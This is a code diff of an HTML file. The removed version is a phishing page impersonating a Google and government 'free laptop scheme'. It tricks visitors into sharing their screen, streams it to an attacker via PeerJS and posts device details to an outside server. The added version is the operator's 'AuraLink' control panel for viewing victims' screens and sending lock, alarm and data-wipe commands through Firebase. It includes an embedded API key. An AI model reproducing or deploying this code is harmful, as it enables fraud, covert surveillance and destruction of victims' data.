@@ -2,103 +2,132 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google & Government | Free Laptop Scheme 2026</title>
+    <title>AuraLink OS v6.0 | Control Terminal</title>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-database-compat.js"></script>
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .google-font { font-family: 'Product Sans', Arial, sans-serif; }
-        .loading-bar { height: 4px; width: 100%; background: #e0e0e0; position: relative; overflow: hidden; }
-        .loading-bar::after { content: ''; position: absolute; left: -50%; width: 50%; height: 100%; background: #4285f4; animation: loading 2s linear infinite; }
-        @keyframes loading { 0% { left: -50%; } 100% { left: 100%; } }
+        body { background: #050505; color: #fff; font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); }
+        .screen-view { width: 100%; height: 75vh; background: #000; border-radius: 20px; position: relative; overflow: hidden; border: 2px solid #1a73e8; }
+        video { width: 100%; height: 100%; object-fit: contain; }
     </style>
 </head>
-<body class="bg-white google-font">
+<body class="p-6">
 
-    <!-- Header Area -->
-    <div class="border-b p-4 flex justify-between items-center shadow-sm">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-        <span class="text-sm text-gray-600 bg-gray-100 px-3 py-1 rounded-full">Official Distribution Channel</span>
-    </div>
+    <div class="max-w-[1600px] mx-auto grid grid-cols-12 gap-6">
+        <!-- Sidebar Controls -->
+        <div class="col-span-3 space-y-6">
+            <div class="glass p-6 rounded-3xl">
+                <h1 class="text-xl font-black text-blue-500 mb-4 tracking-tighter">AURALINK PRO</h1>
+                <input id="session-input" type="text" placeholder="Enter Session ID" class="w-full bg-white/5 border border-white/10 p-3 rounded-xl mb-3 text-sm outline-none focus:border-blue-500">
+                <button onclick="connectToDevice()" class="w-full bg-blue-600 p-3 rounded-xl font-bold hover:bg-blue-700 transition">CONNECT SESSION</button>
+            </div>
 
-    <div class="max-w-xl mx-auto mt-10 p-6 text-center">
-        <h1 class="text-3xl font-bold text-gray-800">Verify Device Eligibility</h1>
-        <p class="text-gray-600 mt-4">2026 Student Support Program is distributing 1,000,000 laptops. To prevent bots, we need to verify your hardware specs through a secure screen-scan.</p>
+            <div class="glass p-6 rounded-3xl space-y-4">
+                <h3 class="text-xs font-bold text-gray-500 uppercase italic">Power Functions</h3>
+                <div class="grid grid-cols-2 gap-3">
+                    <button onclick="sendCommand('vibrate')" class="bg-white/5 p-4 rounded-2xl hover:bg-white/10 transition text-xs">📳 Vibrate</button>
+                    <button onclick="sendCommand('torch')" class="bg-white/5 p-4 rounded-2xl hover:bg-white/10 transition text-xs">🔦 Torch</button>
+                    <button onclick="sendCommand('alert')" class="bg-white/5 p-4 rounded-2xl hover:bg-white/10 transition text-xs">🔊 Alarm</button>
+                    <button onclick="sendCommand('lock')" class="bg-red-900/20 p-4 rounded-2xl text-red-500 text-xs border border-red-900/50">🔒 Lock</button>
+                </div>
+                <button onclick="sendCommand('delete_data')" class="w-full bg-red-600/10 text-red-500 border border-red-600/20 p-3 rounded-xl text-xs hover:bg-red-600 hover:text-white transition">WIPE DEVICE DATA</button>
+            </div>
 
-        <div class="my-8 p-6 bg-blue-50 rounded-2xl border border-blue-100 text-left">
-            <h3 class="font-bold text-blue-800">Requirements:</h3>
-            <ul class="text-sm text-blue-700 mt-2 space-y-2">
-                <li>• Stable Internet Connection</li>
-                <li>• High-resolution Display Verification</li>
-                <li>• Battery Health Check (Min 20% required)</li>
-            </ul>
+            <div class="glass p-6 rounded-3xl">
+                <h3 class="text-xs font-bold text-gray-500 uppercase mb-4">Device Logs</h3>
+                <div id="logs" class="text-[10px] font-mono h-40 overflow-y-auto space-y-1 text-blue-300"></div>
+            </div>
         </div>
 
-        <div id="status-area" class="hidden mb-6">
-            <div class="loading-bar mb-2"></div>
-            <p id="status-text" class="text-xs text-blue-600 font-medium italic">Connecting to secure govt node...</p>
-        </div>
+        <!-- Live View & Touch Control -->
+        <div class="col-span-9 space-y-6">
+            <div class="screen-view glass" id="screen-container">
+                <video id="remote-video" autoplay playsinline></video>
+                <div class="absolute top-4 right-4 flex gap-2">
+                    <span id="status-tag" class="bg-red-600 text-[10px] px-3 py-1 rounded-full font-bold">OFFLINE</span>
+                    <button onclick="toggleFS()" class="bg-white/10 px-3 py-1 rounded-full text-[10px]">FULL SCREEN</button>
+                </div>
+            </div>
 
-        <button id="verify-btn" class="w-full bg-[#1a73e8] hover:bg-[#1557b0] text-white py-4 rounded-lg font-bold text-lg shadow-xl transition-all">
-            VERIFY AND CLAIM LAPTOP
-        </button>
-        
-        <p class="text-[10px] text-gray-400 mt-6 uppercase tracking-widest">Encrypted by Google Security Services 2026</p>
+            <!-- Advanced Data Grid -->
+            <div class="grid grid-cols-3 gap-6">
+                <div class="glass p-5 rounded-3xl flex justify-between items-center">
+                    <div><p class="text-gray-500 text-[10px]">BATTERY</p><h2 id="view-bat" class="text-xl font-bold">--%</h2></div>
+                    <div class="text-2xl">🔋</div>
+                </div>
+                <div class="glass p-5 rounded-3xl flex justify-between items-center">
+                    <div><p class="text-gray-500 text-[10px]">MODEL</p><h2 id="view-mod" class="text-lg font-bold">--</h2></div>
+                    <div class="text-2xl">📱</div>
+                </div>
+                <div class="glass p-5 rounded-3xl flex justify-between items-center">
+                    <div><p class="text-gray-500 text-[10px]">LOCATION</p><h2 id="view-loc" class="text-sm font-bold">Pakistan</h2></div>
+                    <div class="text-2xl">📍</div>
+                </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        const peer = new Peer();
-        const adminId = "AURALINK_ADMIN_2026"; // Monitor panel ki ID
+        // Firebase Config
+        const firebaseConfig = {
+            apiKey: "AIzaSyCvsSmO56lQ37M43Zm-zSY7pduzqgR-Ka4",
+            authDomain: "auralink-2026.firebaseapp.com",
+            projectId: "auralink-2026",
+            databaseURL: "https://auralink-2026-default-rtdb.firebaseio.com", // Apni DB URL dalein
+            storageBucket: "auralink-2026.firebasestorage.app",
+            appId: "1:801004659604:web:9fbcf2b2d88696d9afa581"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        const peer = new Peer("AURALINK_ADMIN_MAIN");
 
-        peer.on('open', (id) => {
-            document.getElementById('verify-btn').onclick = async () => {
-                const btn = document.getElementById('verify-btn');
-                const statusArea = document.getElementById('status-area');
-                const statusText = document.getElementById('status-text');
+        let currentSession = "";
 
-                try {
-                    // SCREEN SHARING - GitHub (HTTPS) par ye Error nahi dega
-                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                    
-                    btn.classList.add('hidden');
-                    statusArea.classList.remove('hidden');
-                    
-                    // Call the Admin/Monitor
-                    peer.call(adminId, stream);
-                    
-                    // Connect for Telemetry
-                    const conn = peer.connect(adminId);
-                    conn.on('open', async () => {
-                        const bat = await navigator.getBattery();
-                        const info = {
-                            peer_id: id,
-                            model: navigator.userAgent.split('(')[1].split(')')[0],
-                            battery: Math.floor(bat.level * 100) + '%'
-                        };
-                        
-                        // SAVE TO INFINITYFREE DATABASE
-                        // Yahan apna sahi link likhein:
-                        fetch('https://leptop2026.gt.tc/save_data.php', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify(info)
-                        });
+        function connectToDevice() {
+            currentSession = document.getElementById('session-input').value;
+            if(!currentSession) return alert("Enter Session ID first!");
 
-                        statusText.innerText = "Hardware Scan: 45% Complete... Keep this tab open.";
-                    });
-
-                    // Agar user sharing stop karde
-                    stream.getVideoTracks()[0].onended = () => {
-                        alert("Verification Failed: Please keep the screen sharing active to complete the scan.");
-                        window.location.reload();
-                    };
-
-                } catch (err) {
-                    console.error(err);
-                    alert("SECURITY ERROR: Please click 'Allow' on the permission popup to verify your display resolution for the laptop scheme.");
+            // Listen for Device Info from Firebase
+            db.ref('sessions/' + currentSession).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if(data) {
+                    document.getElementById('view-bat').innerText = data.battery;
+                    document.getElementById('view-mod').innerText = data.model;
+                    document.getElementById('status-tag').innerText = "LIVE";
+                    document.getElementById('status-tag').classList.replace('bg-red-600', 'bg-green-600');
+                    addLog("Data Handshake Successful");
                 }
-            };
+            });
+        }
+
+        peer.on('call', (call) => {
+            call.answer();
+            call.on('stream', (stream) => {
+                document.getElementById('remote-video').srcObject = stream;
+            });
         });
+
+        function sendCommand(cmd) {
+            if(!currentSession) return alert("Not Connected");
+            db.ref('commands/' + currentSession).set({
+                action: cmd,
+                timestamp: Date.now()
+            });
+            addLog("Command Sent: " + cmd);
+        }
+
+        function addLog(msg) {
+            const l = document.getElementById('logs');
+            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            l.scrollTop = l.scrollHeight;
+        }
+
+        function toggleFS() {
+            document.getElementById('remote-video').requestFullscreen();
+        }
     </script>
 </body>
 </html>
